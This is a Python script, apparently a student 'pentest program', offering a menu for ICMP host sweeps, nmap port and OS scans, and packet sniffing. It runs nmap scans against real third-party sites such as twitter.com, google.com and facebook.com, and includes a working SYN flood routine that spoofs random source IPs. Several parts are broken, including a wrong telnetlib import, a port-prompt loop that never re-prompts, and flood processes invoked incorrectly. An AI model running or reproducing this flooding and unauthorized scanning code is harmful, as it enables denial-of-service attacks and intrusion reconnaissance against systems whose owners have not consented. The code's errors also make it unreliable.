from scapy.layers.inet import ICMP, TCP
from telnetlib import IP
from scapy.all import *
import nmap
import re
import socket
import subprocess
from multiprocessing import Process
ip_add_pattern = re.compile("^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$")
port_range_pattern = re.compile("([0-9]+)-([0-9]+)")
port_min = 0
port_max = 65535


conf.verb = 0
IP_live = []
open_ports = []
nm = nmap.PortScanner()

#Now here you might be change the range of ip adress. I just scan between 198.168.1.1 - 198.168.1.20 here. 
def pingICMP():
    print("-----------------------ICMP PING-----------------------")
    for ip in range(1, 20):
        packet = IP(dst="192.168.1." + str(ip), ttl=20) / ICMP()
        reply = sr1(packet, timeout=1)
        if (reply):
            with open("icmp.dat", "a") as file:
                prim_IP = "192.168.1." + str(ip)
                IP_live.append(prim_IP)
                print(reply.dst, " is online")
                file.write("192.168.1." + str(ip) + ' (live host..)' + '\n')
                file.close()
        else:
            print("Timeout waiting for", packet[IP].dst)
    print(IP_live)

live_hosts = []


def validateIPs():
    ''' 
    with open('icmp.dat','r') as file:
        for line in file:
            words = line.split(" ")
            if ip_add_pattern.search(words):
                live_hosts.append(words)
    '''            
    print("----------- IP VALIDATION ---------------")
    for ip in IP_live:
        result = subprocess.run(['nmap','-sP',ip], stdout=subprocess.PIPE)
        output = result.stdout.decode()
        print(result,output)
    
   

def identify_os(filename):
  # Create an instance of the nmap.PortScanner class
  nm = nmap.PortScanner()

  # Open the input file
  with open(filename, 'r') as f:
    # Read the file line by line
    for line in f:
      # Split the line into host and port information
      host, port = line.split(':')

      # Set the scan options
      options = '-O'

      # Perform the scan and save the results to a variable
      scan_results = nm.scan(host, options=options)

      # Extract the operating system and version from the scan results
      os = nm[host].get('osmatch')[0]['name']
      version = nm[host].get('osmatch')[0]['version']

      # Print the host, operating system, and version
      print(f'{host}: {os} {version}')                 
ips_and_ports = {}
def ScanPort():
    print("-------------- PORT SCANNING --------------------------")
    
    print("Please enter the range of ports you want to scan in format: <int>-<int> (ex would be 60-120)")
    port_range = input("Enter port range: ")
    while True:
        # You can scan 0-65535 ports. This scanner is basic and doesn't use multithreading so scanning
        # all the ports is not advised.
        port_range_valid = port_range_pattern.search(port_range.replace(" ", ""))
        if port_range_valid:
            port_min = int(port_range_valid.group(1))
            port_max = int(port_range_valid.group(2))
            break
    
    open_ports = []
    # We're looping over all the ports in the specified range.
    for ip in IP_live:
        counter = 1
        for port in range(port_min, port_max + 1):
            # try:
            # The result is quite interesting to look at. You may want to inspect the dictionary it returns.
            # It contains what was sent to the command line in addition to the port status we're after.

            result = nm.scan(ip, str(port))
            # Uncomment following line and look at the result
            # print(result)
            # We extract the port status from the returned object
            port_status = (result['scan'][ip]['tcp'][port]['state'])
            if port_status == 'open':
                open_ports.append(port)
            with open("ports.dat", "a") as file:
                try:
                    service = socket.getservbyport(port)
                    file.write(f"Port{port} is {port_status} " + " || " + ip + " || " + service + '\n')
                    print(counter, "port nr", port, "runs service ", service)
                    counter += 1
                except:
                    continue
            print(f"Port {port} is {port_status}")
        # if there are open ports on a specific ip, add them to dict
        if len(open_ports) >= 1:
            ips_and_ports.update({ip: open_ports})
        # except:
        #     # We cannot scan some ports and this ensures the program doesn't crash when we try to scan them.
        #     print(f"Cannot scan port {port}.")
    print(ips_and_ports)
    for ip in ips_and_ports:
        with open("open_ports.dat", "a") as file:
            file.write(ip + " " + str(ips_and_ports.get(ip)) + '\n')

    # print("Open ports file is updated!")
def os_detection():
    print("-----------------------OS DETECTION-----------------------")
    # OS Fingerprint identification
    #counter = 0
    with open("open_ports.dat",'r') as file:
     for line in file:
        list_of_ips = line.split()
        print(list_of_ips[0])
        
        scan_results = nm.scan(list_of_ips[0], arguments='-O')
        os_info = nm[list_of_ips[0]]['osmatch'][0]
        #os_name = os_info['name']
        #os_version = os_info['type']

        #print(scan_results)
        print(f'Operating system: {os_info}')
        #print(f'Version: {os_version}')

def web_server_detection():
    print("---------------------- WEB SERVER DETECTION -------------------")
    target = ['web.ieu.edu.tr', 'twitter.com',"oasis.izmirekonomi.edu.tr","github.com","google.com","youtube.com","nasa.com","facebook.com","tiktok.com","instagram.com"]
    ports = '80-443'  # Scan for HTTP and HTTPS
    options = '-F'  # Enable version detection
    
    for web in target:
      # Perform the scan and save the results to a variable
      web_scan = nm.scan(web, arguments='-F')
      for host in nm.all_hosts():
       print(host)
       print(nm[host].hostname())
       print("state: ",nm[host].state(),"\nprotocols: ", nm[host].all_protocols())
       port_numbers = []
       for proto in nm[host].all_protocols():
            print("-----------")
            lport = nm[host][proto].keys()
        
            for port in lport:
                port_numbers.append(port)
                print('port : %s\tstate : %s'%(port,nm[host][proto][port]['state']))
       with open("web.dat", "a") as file:
                
                file.write(str(host+" "+ nm[host].hostname()+" "+nm[host].state() + " "+ 'open ports: ' + str(port_numbers)) +'\n')
        
            
def randomIP():
	ip = ".".join(map(str, (random.randint(0,255)for _ in range(4))))
	return ip

def randInt():
	x = random.randint(1000,9000)
	return x	

def SYN_Flood(dstIP,dstPort,counter):
  total = 0
  print ("Packets are sending ...")
  
  for x in range (0,counter):
   
   s_eq = randInt()
   

   IP_Packet = IP ()
   IP_Packet.src = randomIP()
   IP_Packet.dst = dstIP

   TCP_Packet = TCP ()	
   TCP_Packet.sport = x
   TCP_Packet.dport = dstPort
   TCP_Packet.flags = "S"
   TCP_Packet.seq = s_eq
   
   send(IP_Packet/TCP_Packet)
   total+=1
  
  
  sys.stdout.write("\nTotal packets sent: %i\n" % total)
     
 
def Sniff():
   capture = sniff(count = 10)
   capture.summary()
   
def Show():
    f1 = open("icmp.dat", "r")
    
    f2 = open("open_ports.dat", "r")
    f3 = open("web.dat", "r")
    
    
   

    print("ICMP File"+"\n" + f1.read(),
          "\nOpen Ports File"+"\n" + f2.read(),
          "\nWeb File"+"\n" + f3.read(),
         )

    f1.close()
    f2.close()
    f3.close()
    
           


print("Welcome to the pentest program")

while True:
    print("""
      1- ICMP Ping
      2- Port Identification
      3- Operating System Detection
      4- Web Server Detection
      5- SYN_flood and Sniffing 
      6- Show Files
      7- EXIT
      
      """)
    print("-----------------------------------------")
    choice = input('SELECT AN OPTION: ')
    if choice == '1':
        pingICMP()
        
    elif choice == '2':
       
       validateIPs()
       ScanPort()  
    elif choice == '3':
        os_detection()
    elif choice == '4':
        web_server_detection()
    elif choice == '5':
        p1 = Process(target=SYN_Flood('192.168.1.1',25,10))
        
        p2 = Process(target=Sniff())
        p1.start()
        p2.start()
        p1.join()
        p2.join()

    elif choice == '6':
        Show()
   
    elif choice == '7':
        print("Goodbye!")
        break
    else:
        print("Wrong input!")
